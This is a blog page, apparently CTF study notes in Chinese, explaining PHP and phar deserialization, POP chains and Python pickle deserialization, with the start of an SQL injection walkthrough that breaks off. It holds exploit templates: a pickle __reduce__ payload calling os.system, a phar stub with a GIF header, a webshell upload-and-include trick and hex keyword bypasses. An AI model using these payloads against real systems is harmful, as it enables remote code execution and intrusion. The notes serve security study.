<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Web/注入漏洞/反序列化/反序列化详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="反序列化详解"><a href="#反序列化详解" class="headerlink" title="反序列化详解"></a>反序列化详解</h1><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><blockquote>
<p>将各种类型的数据压缩按照一定格式存储的过程 使用函数serialize()</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"><span class="meta">&lt;?php</span>0－</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">    ...一些方法 不过序列化不在意这些</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//序列化结果</span></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;DEMO1&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;evi l&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;phpinfo()&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">这里的O表示这是一个对象</span><br><span class="line">    对象名占<span class="number">5</span>个字符</span><br><span class="line">    对象名是DEMO1</span><br><span class="line">    对象有<span class="number">2</span>个属性</span><br><span class="line">    注意属性的长度存在不可见字符<span class="number">0</span>  用来区分属性 是<span class="keyword">public</span> 还是<span class="keyword">private</span> 或者<span class="keyword">protected</span></span><br></pre></td></tr></table></figure>

<h3 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">php反序列化</a>漏洞又称**&#x3D;&#x3D;对象注入&#x3D;&#x3D;** ， 可能会导致&#x3D;&#x3D;远程代码执行（RCE）&#x3D;&#x3D;</p>
<p>理解为&#x3D;&#x3D;漏洞执行unserialize函数&#x3D;&#x3D; 调用某一类并&#x3D;&#x3D;执行魔术方法&#x3D;&#x3D; 之后&#x3D;&#x3D;执行类中的函数&#x3D;&#x3D; 产生安全问题</p>
</blockquote>
<blockquote>
<h3 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h3><ol>
<li>unserialize()函数的&#x3D;&#x3D;变量可控&#x3D;&#x3D;</li>
<li>php文件中存在&#x3D;&#x3D;可利用的类&#x3D;&#x3D;，类中有&#x3D;&#x3D;魔术方法&#x3D;&#x3D;</li>
</ol>
</blockquote>
<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><blockquote>
<h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><ol>
<li>把题目代码<strong>复制</strong>到本地</li>
<li>&#x3D;&#x3D;注释掉方法&#x3D;&#x3D;和&#x3D;&#x3D;一些没有用的东西&#x3D;&#x3D;</li>
<li>本地对&#x3D;&#x3D;属性赋值&#x3D;&#x3D;，&#x3D;&#x3D;构造序列化&#x3D;&#x3D;，<strong>url编码后输出</strong>，避免把&#x3D;&#x3D;不可见字符&#x3D;&#x3D;的影响</li>
</ol>
</blockquote>
<h5 id="操作过程举例："><a href="#操作过程举例：" class="headerlink" title="操作过程举例："></a>操作过程举例：</h5><p>对源代码进行注释后赋值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="comment">//赋值</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public function safe()&#123;</span></span><br><span class="line"><span class="comment">// echo $this-&gt;arg;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function evil() &#123;</span></span><br><span class="line"><span class="comment">// eval($this-&gt;arg);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function run()&#123;</span></span><br><span class="line"><span class="comment">// $this-&gt;&#123;$this-&gt;func&#125;();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $obj = unserialize($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">// $obj-&gt;run();</span></span><br></pre></td></tr></table></figure>

<p>然后再在最后输出结果</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));    <span class="comment">//单纯序列化</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>())));    <span class="comment">//进行url编码</span></span><br></pre></td></tr></table></figure></blockquote>
<p>‍</p>
<h3 id="三种赋值"><a href="#三种赋值" class="headerlink" title="三种赋值"></a>三种赋值</h3><p>内部直接赋值 只能赋值字符串</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure></blockquote>
<p>外部赋值 只能访问public属性的变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建一个然后直接输出这个$o</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">DEMO1</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; arg = <span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>)); </span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>小技巧：</strong>  对于php7.1+版本，对属性容错机制较高，就算不是public也可以在本地修改成public</p>
</blockquote>
<h6 id="构造方法赋值-万能方法-解决上述所有麻烦"><a href="#构造方法赋值-万能方法-解决上述所有麻烦" class="headerlink" title="构造方法赋值 (万能方法)解决上述所有麻烦"></a>构造方法赋值 (万能方法)解决上述所有麻烦</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; arg = <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h3 id="POP-chain"><a href="#POP-chain" class="headerlink" title="POP chain"></a>POP chain</h3><h4 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()		   <span class="comment">//对象创建(new)时会自动调用。</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 		       <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 		       <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 	       <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() 		       <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 	       <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() 		       <span class="comment">//用于从不可访问的属性读取数据 包括private或者是不存在的</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() 		       <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 		       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()  		       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 		   <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()             <span class="comment">//当脚本尝试将对象调用为函数时触发  就是加了括号</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()           <span class="comment">//在代码中当调用不存在的类时会</span></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h4 id><a href="#" class="headerlink" title></a></h4><h2 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h2><h4 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h4><ol>
<li>写出基本序列化</li>
<li>写出注入的对象</li>
<li>写出注入的对象 分析是长到短还是短到长的替换，决定要把对象注入到什么地方</li>
<li>算清楚替换的差值，计算需要吃掉或挤出（逃逸）的字符串长度，保证这个长度是替换的差值的整数倍，如果不是 则加字符串</li>
<li>构造替换，对象注入</li>
</ol>
<h4 id="长到短的替换"><a href="#长到短的替换" class="headerlink" title="长到短的替换"></a>长到短的替换</h4><p>在第一个元素进行替换，进而吃掉第二个元素的约束，第二个元素就逃逸出来了</p>
<h4 id="短到长的替换"><a href="#短到长的替换" class="headerlink" title="短到长的替换"></a>短到长的替换</h4><p>暂缺</p>
<p>‍</p>
<h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h3 id="Phar是什么？"><a href="#Phar是什么？" class="headerlink" title="Phar是什么？"></a>Phar是什么？</h3><p>可以将多个文件组合成一个文件，</p>
<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>phar:&#x2F;&#x2F;xxx.phar&#x2F;1.png</p>
<p>zip:&#x2F;&#x2F;xxx.zip#1.png</p>
<h3 id="攻击思路-在上传包含中的利用"><a href="#攻击思路-在上传包含中的利用" class="headerlink" title="攻击思路 在上传包含中的利用"></a>攻击思路 在上传包含中的利用</h3><p>可以上传图片，不能上传php</p>
<p>可以包含 但是只能<code>include(&#39;$userinput.php&#39;);</code>​</p>
<p>压缩一个shell.php到1.zip,重命名为1.png，上传</p>
<p>包含：zip:&#x2F;&#x2F;upload.png#shell或phar:&#x2F;&#x2F;upload.png&#x2F;shell 因为在包含的时候在尾部上面的include会拼接上一个php</p>
<h3 id="如何反序列化"><a href="#如何反序列化" class="headerlink" title="如何反序列化"></a>如何反序列化</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ol>
<li>需要有可用的类，类下有魔术方法，最后POP chain调用到危险方法</li>
<li>需要文件操作函数去触发 <code>phar://</code>​ stream</li>
<li>有上传或者写文件的操作，可以把无损phar文件写入web服务器，后缀名任意</li>
</ol>
<h4 id="本地phar的条件"><a href="#本地phar的条件" class="headerlink" title="本地phar的条件"></a>本地phar的条件</h4><p>在php.ini中 <strong>phar.readonly</strong>  <strong>&#x3D;</strong>  <strong>Off</strong></p>
<h4 id="构造phar反序列化"><a href="#构造phar反序列化" class="headerlink" title="构造phar反序列化"></a>构造phar反序列化</h4><ol>
<li>把class定义的代码抄下来，把方法注释了</li>
<li>构造pop链</li>
<li><del>echo serialize($o)</del></li>
<li>贴phar八股文</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>还是正常做反序列化的流程，找pop chain，然后本地构造好序列化</p>
<p>之前:echo serialize($o);</p>
<p>现在:生成phar文件把$o加载进去 就是在setMetadata中</p>
<h4 id="可以利用的函数"><a href="#可以利用的函数" class="headerlink" title="可以利用的函数"></a>可以利用的函数</h4><p><img src="/.com//17476573059446373117876879156311-20250519202147-4srw68y.png" alt="17476573059446373117876879156311"></p>
<h4 id="绕过反序列化中的关键字"><a href="#绕过反序列化中的关键字" class="headerlink" title="绕过反序列化中的关键字"></a>绕过反序列化中的关键字</h4><h5 id="hex-通用"><a href="#hex-通用" class="headerlink" title="hex 通用"></a>hex 通用</h5><p>&#x3D;&#x3D;s:1:“A” 和 S:1:”\61”是一样的意思&#x3D;&#x3D;</p>
<p>当标识字符串的s为大写的时候，\hex标识对应字符</p>
<p>所以绕过flag的过滤：S:4:“\66\6c\61\67”</p>
<h5 id="绕过-0字符-php7-1"><a href="#绕过-0字符-php7-1" class="headerlink" title="绕过\0字符 php7.1+"></a>绕过\0字符 php7.1+</h5><p>虽然类中定义的属性可能不是public 但是我们可以假装是public，然后生成public类型的反序列化字符串。由于PHP7.1+的容错机制可以反序列化成功</p>
<p>private-&gt;public</p>
<p>‍</p>
<h1 id="0720-Pickle反序列化"><a href="#0720-Pickle反序列化" class="headerlink" title="0720 Pickle反序列化"></a>0720 Pickle反序列化</h1><h3 id="what-is-Pickle？"><a href="#what-is-Pickle？" class="headerlink" title="what is Pickle？"></a>what is Pickle？</h3><ul>
<li>是<strong>python</strong>的一个模块，内存中的东西因为断电等原因容易丢失，可以将对象以文件的形式存放在磁盘上 实现持久化存储</li>
<li>只能在python中使用 import pickle</li>
<li>序列化后的数据可读性非常差 人一般无法识别</li>
<li>cPickle模块是C语言实现的</li>
</ul>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>​<code>pickle.dump(obj, file[,protocol])</code>​</p>
<p>如果加s dumps 返回字符串 否则是到文件中</p>
<p>序列化对象，将结果数据流写入到文件对象中</p>
<p>参数protocol是序列化模式，默认为0，表示以文本的形式序列化，还可以是1或2，表示以二进制的形式序列化</p>
<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">name</span>=&quot;<span class="title">test</span>&quot;):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">name</span> = <span class="title">name</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">say</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">print</span>(&quot;<span class="title">Hello</span> ! <span class="title">My</span> <span class="title">friends</span>&quot;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">a</span> = <span class="title">People</span>()</span></span><br><span class="line"><span class="class"><span class="title">c</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">a</span>)</span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="title">c</span>)</span></span><br></pre></td></tr></table></figure>

<p>out: 很多不可见字符</p>
<p>​<code>b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x04test\x94sb.&#39;</code>​</p>
<p>生成的规则涉及到PVM：用来解释字节码的解释引擎</p>
<p>‍</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>​<code>pickle.load(file)</code>​</p>
<p>如果加s dumps 返回字符串 否则是到文件中</p>
<p>反序列化对象。将文件中的数据解析为一个python对象；</p>
<p>需要注意：使用时需要让python能够找到类的定义 否则会报错</p>
<p>‍</p>
<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>Pickle是一门基于栈的编程语言，有不同的编写方式，本质是一个轻量级的PVM（在Java中等同于JVM，用于解释字节码的解释引擎）</p>
<p>有三个部分组成：</p>
<ol>
<li><strong>指令处理器（Instruction processor）</strong></li>
</ol>
<p>从数据流读取操作码和参数，对其进行解释处理 指令处理器会循环执行整个过程，不断改变stack(堆栈)和memo(备忘录)区域的值 直到遇到‘ <strong>.</strong> ‘这个结束符号。这时，最终停留在栈顶的值将会被作为反序列化对象返回。</p>
<ol start="2">
<li><strong>栈区（stack）</strong></li>
</ol>
<p>由python的列表list实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果。</p>
<ol start="3">
<li><strong>内存区（memo）</strong></li>
</ol>
<p>由python的字典dict实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供存储功能，即将反序列化完成的数据以key-value的形式储存在memo中以便使用。</p>
<p>在第一部分中的IP常用操作码：</p>
<ul>
<li><p><strong>c</strong>：读取本行的内容作为模块名module，读取下一行内容作为对象名object，然后将module.object作为可调用对象压入栈中</p>
</li>
<li><p><strong>(</strong> ：将标记对象（mark）压入栈中，用于确定命令执行的位置，搭配t指令一起使用以便产生一个元组</p>
</li>
<li><p><strong>S</strong>: 后跟字符串在引号内 直到出现换行符 PVM将读取的内容压入栈中</p>
</li>
<li><p><strong>t</strong> : 从栈中向外弹出数据，弹射顺序从栈顶一点点出到元组依次后排 直到弹出左括号 此时弹出内容形成一个元组 然后再压入栈中</p>
</li>
<li><p><strong>R</strong> : 将之前压入栈中的元组（t）和可调用对象（c）全部弹出，然后将该元组作为可调用参数的对象并执行该对象。最终将结果压入到栈中。</p>
</li>
<li><p><strong>.</strong>  : 结束整个Pickle反序列化过程</p>
</li>
</ul>
<p><img src="/.com//1747658503023977923255372684818-20250519204144-7ybitsg.png" alt="1747658503023977923255372684818"></p>
<p><img src="/.com//17476585059844407908704057067474-20250519204146-hby8s9y.png" alt="17476585059844407908704057067474"></p>
<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
<p><img src="/.com//17476585130011225927306100130946-20250519204153-53pqeav.png" alt="17476585130011225927306100130946"></p>
<p><img src="/.com//17476585152762147770201117664215-20250519204156-hmuqk2h.png" alt="17476585152762147770201117664215"></p>
<p>实际代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__reduce__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">a</span> = &#x27;<span class="title">whoami</span>&#x27;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> (<span class="title">os</span>.<span class="title">system</span>, (<span class="title">a</span>,))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">o</span> = <span class="title">A</span>()</span></span><br><span class="line"><span class="class">#序列化</span></span><br><span class="line"><span class="class"><span class="title">test</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">o</span>)</span></span><br><span class="line"><span class="class">#反序列化</span></span><br><span class="line"><span class="class"><span class="title">pickle</span>.<span class="title">loads</span>(<span class="title">test</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#本地运行结果即为电脑名称</span></span><br></pre></td></tr></table></figure>

<p><strong>做题步骤</strong></p>
<ol>
<li>找 pickle反序列化位点</li>
<li>本地重写reduce方法，生成反序列化字符串</li>
<li>触发反序列化</li>
</ol>
<p><strong>与php反序列化的区别</strong></p>
<p>php中能做什么由网站里面的class类写得方法决定</p>
<p>但是pickle只要存在反序列化的位点就可以任意执行，因为本地可以重写reduce方法</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" data-id="cmawcfx9q003fcg7k6bch8mzs" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/基础注入流程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="基础注入流程"><a href="#基础注入流程" class="headerlink" title="基础注入流程"></a>基础注入流程</h1><h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><pre><code>**1、寻找注入点：**

	和数据库有交互  ？aa=bbb

**2、判断闭合方式(依靠数字型不需要闭合，字符型需要闭合）**

	?id=1asdf  看是否报错：有报错：数字型  无报错：字符型
</code></pre>
<p>方法二：判断出注入类型涉及到了后续的注入过程中需不需要闭合单引号(‘)，通过“1and 1&#x3D;1#”和“1’and 1&#x3D;2#”进行判断，如果页面有不同的变化，则说明是字符型的注入，因为字符型的参数是需要引号引起来的。</p>
<pre><code>**3、再判断闭合方式**

	?id=1asdf&#39; 通过 () “” ‘’ 必须两两互相匹配的道理来判断闭合的方式
</code></pre>
<blockquote>
<p>select * from users where id&#x3D;’1asdf’ – ‘ limit 0,1</p>
</blockquote>
<pre><code>**4、判断数据库有几列以及回显位**
</code></pre>
<blockquote>
